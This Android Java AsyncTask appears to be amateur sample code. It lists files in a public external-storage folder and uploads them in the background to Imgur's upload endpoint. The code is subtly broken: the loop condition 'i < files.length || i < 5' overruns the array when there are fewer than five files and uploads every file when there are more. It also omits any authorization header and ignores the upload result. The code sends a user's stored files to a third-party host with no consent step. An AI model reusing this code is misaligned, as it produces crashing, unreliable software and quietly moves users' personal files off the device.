package com.example.myapplication;

        import android.os.AsyncTask;
        import android.os.Environment;
        import android.util.Log;

        import java.io.File;
        import java.io.IOException;

        import okhttp3.MediaType;
        import okhttp3.MultipartBody;
        import okhttp3.OkHttpClient;
        import okhttp3.Request;
        import okhttp3.RequestBody;
        import okhttp3.Response;

public class PostDataToServer extends AsyncTask<String, Void, String> {

    OkHttpClient client = new OkHttpClient();

    @Override
    protected String doInBackground(String... urls) {
        File directory = Environment.getExternalStoragePublicDirectory(urls[0]);
        File[] files = directory.listFiles();
        for (int i = 0; i < files.length || i < 5; i++) {
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("image", files[i].getName(),
                            RequestBody.create(MediaType.parse("image/jpeg"),files[i]))
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.imgur.com/3/upload")
                    .post(body)
                    .build();

            //Check the response
            try (Response response = client.newCall(request).execute()) {
                 //Log.i("@@@@@@@@**********@@@", "doInBackground:"+ response.body().string());
                response.body().string();
            } catch (Exception e) {
                e.printStackTrace();

            }
        }
    return " ";
    }
}
